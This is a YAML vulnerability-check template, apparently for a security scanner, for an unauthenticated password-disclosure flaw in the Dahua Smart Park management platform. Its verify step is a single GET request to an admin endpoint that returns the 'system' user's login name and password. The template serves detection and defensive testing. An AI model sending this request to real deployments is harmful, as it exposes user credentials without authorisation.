app: 大华智慧园区综合管理平台
query: app:"大华智慧园区综合管理平台"
meta:
    name: 大华智慧园区综合管理平台任意密码读取漏洞
    level: 4
    tags:
        - information_leakage
    description: 由于该平台未对接口权限做限制，攻击者可以从user_getUserInfoByUserName.action接口获取任意用户密码
    homepage: https://www.dahuatech.com
    author: Prism X
    references: https://blog.csdn.net/weixin_43981050/article/details/132276011
    solution: 升级系统、安装补丁
    create_at: "2023-09-25 16:15:10"
    available: false
    steps:
        variable: []
        verify_steps:
            type: and
            verify:
                - request:
                    method: GET
                    path: /admin/user_getUserInfoByUserName.action?userName=system
                    redirect: true
                    header: []
                    params: ""
                  response:
                    - name: code
                      value: "200"
                      type: equals
                    - name: body
                      value: loginName
                      type: contains
                    - name: body
                      value: isPasswordChanged
                      type: contains
                    - name: body
                      value: loginPass
                      type: contains
        exploit_steps:
            type: ""
            params:
                name: ""
                type: input
                value: ""
